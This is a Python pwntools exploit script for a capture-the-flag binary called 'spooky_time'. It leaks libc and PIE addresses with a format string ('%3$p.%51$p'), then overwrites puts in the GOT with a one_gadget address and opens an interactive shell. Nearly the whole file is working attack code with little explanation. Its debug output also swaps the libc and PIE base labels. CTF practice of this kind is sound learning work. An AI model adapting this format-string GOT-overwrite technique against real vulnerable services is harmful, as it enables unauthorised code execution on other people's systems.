#!/usr/bin/python3
# @author: CryptoCat (https://github.com/Crypto-Cat/CTF/tree/main/pwn)
# Modified by An00bRektn
from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
break main
'''.format(**locals())

# Binary filename
exe = './spooky_time'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./glibc/libc.so.6")
ld = ELF("./glibc/ld-linux-x86-64.so.2")

# Start program
io = start()
# %3$p.%51$p
# 0x114a37
# 0x13c0
io.sendlineafter('scary!', '%3$p.%51$p')
io.recvlineS()
io.recvlineS()
io.recvlineS()
io.recvlineS()
leaks = [int(x, 16) for x in io.recvlineS().split('.')]

libc.address = leaks[0] - 0x114a37
elf.address = leaks[1] - 0x13c0

info("libc base: %#x", elf.address)
info("pie base : %#x", libc.address)

def send_payload(payload):
    io.sendline(payload)
    return io.recvline()

# Find the offset for format string write
format_string = FmtStr(execute_fmt=send_payload, offset=8)
info("format string offset: %d", format_string.offset)

one_gadget = 0xebcf1
# Print address to overwrite (puts) and what we want to write (the one gadget)
info("address to overwrite (elf.got.puts): %#x", elf.got.puts)
info("address to write (one gadget): %#x", one_gadget + libc.address)#libc.symbols.system)

fmt_payload = fmtstr_payload(8, { elf.got.puts: one_gadget + libc.address })
io.sendlineafter('time..', fmt_payload)

io.interactive()